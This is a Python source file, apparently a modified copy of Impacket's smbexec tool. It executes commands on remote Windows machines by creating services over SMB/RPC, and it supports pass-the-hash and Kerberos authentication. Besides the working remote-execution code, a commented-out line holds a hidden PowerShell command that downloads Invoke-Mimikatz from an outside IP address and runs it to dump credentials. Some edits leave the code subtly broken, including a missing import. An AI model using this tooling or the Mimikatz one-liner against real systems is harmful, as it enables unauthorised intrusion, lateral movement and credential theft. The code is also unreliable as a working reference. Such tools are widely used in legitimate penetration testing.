#!/usr/bin/env python
# Copyright (c) 2003-2016 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A similar approach to psexec w/o using RemComSvc. The technique is described here
# http://www.accuvant.com/blog/owning-computers-without-shell-access
# Our implementation goes one step further, instantiating a local smbserver to receive the 
# output of the commands. This is useful in the situation where the target machine does NOT
# have a writeable share available.
# Keep in mind that, although this technique might help avoiding AVs, there are a lot of 
# event logs generated and you can't expect executing tasks that will last long since Windows 
# will kill the process since it's not responding as a Windows service. 
# Certainly not a stealthy way.
#
# This script works in two ways:
# 1) share mode: you specify a share, and everything is done through that share.
# 2) server mode: if for any reason there's no share available, this script will launch a local
#    SMB server, so the output of the commands executed are sent back by the target machine
#    into a locally shared folder. Keep in mind you would need root access to bind to port 445 
#    in the local machine.
# 
# Author:
#  beto (@agsolino)
#
# Reference for:
#  DCE/RPC and SMB.

import sys
import os
import cmd
import argparse
import configparser
import logging
from threading import Thread

from impacket.examples import logger
from impacket import version, smbserver
from impacket.smbconnection import *
from impacket.dcerpc.v5 import transport, scmr

totalOutput = ''

OUTPUT_FILENAME = '__output'
BATCH_FILENAME  = 'execute.bat'
SMBSERVER_DIR   = '__tmp'
DUMMY_SHARE     = 'TMP'

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.smb = None

    def cleanup_server(self):
        logging.info('Cleaning up..')
        try:
            os.unlink(SMBSERVER_DIR + '/smb.log')
        except:
            pass
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = configparser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        logging.info('Creating tmp directory')
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception as e:
            logging.critical(str(e))
            pass
        logging.info('Setting up SMB Server')
        self.smb.processConfigFile()
        logging.info('Ready to listen...')
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class CMDEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None,
                 doKerberos=None, kdcHost=None, mode=None, share=None, port=445, command=''):

        self.__command = command
        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = 'BTOBTO'
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__mode  = mode
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, remoteName, remoteHost):
        stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport,'preferred_dialect'):
            rpctransport.preferred_dialect(SMB_DIALECT)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.shell = None
        try:
            if self.__mode == 'SERVER':
                serverThread = SMBServer()
                serverThread.daemon = True
                serverThread.start()
            self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName,self.__command)

            #self.shell.cmdloop()
            if self.__mode == 'SERVER':
                serverThread.stop()
        except  (Exception, KeyboardInterrupt) as e:
            #import traceback
            #traceback.print_exc()
            #logging.critical(str(e))
            try:
                if self.shell is not None:
                    self.shell.finish()
            except:
                pass
            sys.stdout.flush()
            #sys.exit(1)

    def getOutput(self):
        global totalOutput
        totalOutput1=''
        totalOutput1=totalOutput
        totalOutput=''
        return totalOutput1

    def stop(self):
        try:
            self.shell.finish()
        except:
            pass
class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName, command):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        #self.intro = '[!] Launching semi-interactive shell - Careful what you execute'
        self.__command = command

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.send_data(command)
        #self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect() 
           self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        # We just can't CD or mantain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ' )
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = string.replace(self.__outputBuffer,'\r\n','') + '>'
            self.__outputBuffer = ''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            global totalOutput
            totalOutput += data
            #self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile 

        logging.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
        service = resp['lpServiceHandle']

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()
        self.finish()

    def send_data(self, data):
        self.execute_remote(data)
        print(self.__outputBuffer)
        self.__outputBuffer = ''


# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-share', action='store', default = 'C$', help='share where the output will be grabbed from '
                                                                       '(default C$)')
    parser.add_argument('-mode', action='store', choices = {'SERVER','SHARE'}, default='SHARE',
                        help='mode to use (default SHARE, SERVER needs root!)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store',metavar = "ip address", help='IP Address of the domain controller. '
                       'If ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address", help='IP Address of the target machine. If '
                       'ommited it will use whatever was specified as target. This is useful when target is the NetBIOS '
                       'name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')

 
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re
    domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

    #In case the password contains '@'
    if '@' in remoteName:
        password = password + '@' + remoteName.rpartition('@')[0]
        remoteName = remoteName.rpartition('@')[2]

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.target_ip is None:
        options.target_ip = remoteName

    if options.aesKey is not None:
        options.k = True

    try:
        command="ipconfig.exe /all"
        #command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe  -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass  \"IEX (New-Object Net.WebClient).DownloadString('http://172.16.126.190:8000/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
        executer = CMDEXEC(username, password, domain, options.hashes, options.aesKey, options.k,
                           options.dc_ip, options.mode, options.share, int(options.port), command)
        executer.run(remoteName, options.target_ip)
    except Exception as e:
        logging.critical(str(e))
    sys.exit(0)
